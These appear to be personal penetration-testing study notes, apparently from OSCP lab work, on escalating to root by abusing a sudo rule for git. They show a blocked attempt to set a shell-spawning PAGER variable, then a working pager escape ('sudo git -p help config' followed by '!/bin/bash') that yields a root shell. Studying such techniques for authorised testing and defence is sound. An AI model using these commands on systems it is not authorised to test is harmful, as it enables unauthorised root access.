## [[masterDoc/myMethodology/Exploitation/Escalation/linuxEscalation/GTFOBins]]
https://gtfobins.github.io/

git search example

Sudo abuse vector for git
![[masterDoc/offsec/OSCP/Pictures/Pasted image 20240830182702.png]]

Abusing git sudo command by setting an environment variable
```
daniela@websrv1:~$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help
sudo: sorry, you are not allowed to set the following environment variables: PAGER
```

Abusing git sudo command by launching pager in a privileged context
```
daniela@websrv1:~$ sudo git -p help config
```

Executing commands via the pager to obtain an interactive shell
```
...
       •   no section or name was provided (ret=2),

       •   the config file is invalid (ret=3),

!/bin/bash

root@websrv1:/home/daniela# whoami
root
```

